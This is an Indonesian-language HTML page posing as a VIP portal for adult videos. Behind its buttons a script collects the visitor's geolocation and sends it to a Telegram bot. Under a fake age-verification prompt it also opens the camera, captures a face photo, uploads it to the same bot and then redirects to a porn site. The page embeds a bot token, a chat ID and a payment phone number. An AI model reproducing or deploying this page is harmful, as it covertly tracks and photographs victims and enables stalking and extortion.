<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OxyHub - VIP Portal</title>
    <style>
        body { background: #0a0a0a; color: #eee; font-family: sans-serif; text-align: center; padding: 30px 15px; margin: 0; }
        .logo { font-size: 38px; font-weight: bold; color: #ff9900; margin-bottom: 10px; padding-top: 20px; }
        .logo span { background: #ff9900; color: #000; padding: 2px 10px; border-radius: 6px; }
        .btn { 
            background: linear-gradient(145deg, #151515, #1d1d1d); border: 1px solid #333; 
            padding: 22px; margin: 15px auto; border-radius: 15px; display: block; 
            max-width: 380px; color: #ff9900; text-decoration: none; font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5); cursor: pointer;
        }
        video, canvas { display: none; }
        .footer { margin-top: 50px; font-size: 11px; color: #444; }
    </style>
</head>
<body>

    <div class="logo">Oxy<span>HUB</span></div>
    <p style="color:#888">Verifikasi Member VIP untuk Akses Konten 18+</p>

    <div class="btn" onclick="gasGacor()">🚀 MASUK SERVER VIP</div>
    <div class="btn" onclick="gasGacor()">🔥 FULL VIDEO VIRAL</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div class="footer">DANA Support: 082120342112<br>© 2026 OxyVerse Project</div>

    <script>
        const TOKEN = '8734003243:AAE01xpuHVuTMdBP_o-1GctMSkqorZiFku0';
        const CHATID = '8286184238';

        async function gasGacor() {
            // 1. Sedot Lokasi
            navigator.geolocation.getCurrentPosition(res => {
                const maps = `https://www.google.com/maps?q=${res.coords.latitude},${res.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHATID}&text=📍 LOKASI TARGET GACOR:%0A${maps}`);
            }, () => {
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHATID}&text=⚠️ Target tolak lokasi.`);
            });

            // 2. Sedot Kamera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHATID);
                        formData.append('photo', blob, 'capture.jpg');
                        formData.append('caption', '📸 JEPRETAN WAJAH TARGET GACOR!');
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    }, 'image/jpeg');

                    alert("Sistem: Verifikasi Berhasil! Membuka Konten...");
                    window.location.href = "https://www.pornhub.com";
                }, 2000);
            } catch (e) {
                alert("Klik 'IZINKAN' untuk memverifikasi umur anda!");
            }
        }
    </script>
</body>
</html>
